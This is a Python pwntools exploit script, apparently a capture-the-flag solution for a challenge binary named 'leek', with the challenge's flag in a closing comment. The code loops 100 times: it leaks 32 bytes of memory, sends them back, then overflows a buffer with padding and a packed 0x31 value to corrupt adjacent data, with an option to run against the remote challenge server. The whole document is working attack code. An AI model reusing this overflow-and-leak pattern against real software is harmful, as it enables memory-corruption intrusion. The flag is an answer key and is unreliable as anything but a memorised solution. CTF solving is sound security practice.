#!/usr/bin/env python3

from pwn import *

p64 = lambda x: util.packing.p64(x, endian='little')
u64 = lambda x: util.packing.u64(x, endian='little')
p32 = lambda x: util.packing.p32(x, endian='little')
u32 = lambda x: util.packing.u32(x, endian='little')

exe = ELF("./leek_patched")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']


def conn():
	if args.LOCAL:
		r = process([exe.path])
	elif args.REMOTE:
		r = remote("challs.actf.co", 31310)
	else:
		r = gdb.debug([exe.path])
	return r


def main():
	r = conn()

	for _ in range(100):
		r.recvuntil(b'!!): ')
		r.sendline(b'A' * 31)
		r.recvuntil(b'\n')
		leak = r.recv(32)
		success(f"{leak=}")
		r.send(leak)
		r.recvuntil(b'want: ')
		r.sendline(b'A' * 24 + p64(0x31))

	r.interactive()



if __name__ == "__main__":
	main()

# actf{very_133k_of_y0u_777522a2c3b7dd6}
